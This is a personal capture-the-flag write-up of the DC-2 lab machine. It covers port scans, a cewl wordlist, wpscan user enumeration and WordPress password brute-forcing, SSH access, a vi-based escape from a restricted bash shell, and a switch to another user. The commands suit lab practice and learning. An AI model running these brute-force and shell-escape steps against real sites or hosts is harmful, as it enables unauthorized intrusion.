Linux ttl=61

# rustscan

```
80/tcp   open  http       syn-ack ttl 61
7744/tcp open  raqmon-pdu syn-ack ttl 61
```

# nmap

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.2.0 (90%), Linux 3.16 (89%), Linux 3.13 (89%), Linux 3.10 - 4.11 (87%), Linux 3.12 (87%), Linux 3.13 or 4.2 (87%), Linux 3.16 - 4.6 (87%), Linux 3.2 - 4.9 (87%)
No exact OS matches for host (test conditions non-ideal).
```


Got only 2 ports

# initial

need to add ip in hosts as `dc-2`
it was wordpress site

![[Pasted image 20240614004206.png]]

as suggested, need to do something with `cewl`

> [!NOTE]
> Cewl auto makes wordlists from a webpage

### cewl

```
cewl http://dc-2/ -m 5 -w words.txt
```

but as it was wordpress, started this command without thinking more

```
wpscan --url http://dc-2/ -e p,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive
```

but it takes a lot of time as we don't need everything from it

![[Pasted image 20240614004720.png]]

though it given me useful shit

### wpscan

```
wpscan --url http://dc-2/ -e u --plugins-detection aggressive --plugins-version-detection aggressive
```

this thing given me users

```
wpscan --url http://dc-2/ -U users -P words.txt
```

brute force for wordpress

![[Pasted image 20240614005007.png]]

login into wordpress but it was just normal users so didn't got admin panel so toested toester suggested for SSH

# priv esc

got SSH shell as tom

![[Pasted image 20240614005449.png]]

and that was -rbash shell which is limited, can't run even any command with `/`

![[Pasted image 20240614005654.png]]

need to breakout that stupid `-rbash`

### 2 ways to escape

#### 1. vi

gtfobins

```
vi
:set shell=/bin/sh
:shell
```

![[Pasted image 20240614012038.png]]

1st didn't worked only if I tried 2nd then didn't wasted 30 minutes lol but I leaned new way of scp
#### 2. bin/bash transfer - easy/peasy

even downloaded `static bash linux` but didn't worked

https://github.com/robxu9/bash-static/releases/tag/5.2.015-1.2.3-2

make this `bash.sh`

![[Pasted image 20240614013206.png]]

![[Pasted image 20240614013323.png]]
### actual priv esc

then tried to switch user to jerry and it worked for known password

![[Pasted image 20240614012528.png]]

woo-hoo gtfobins lol!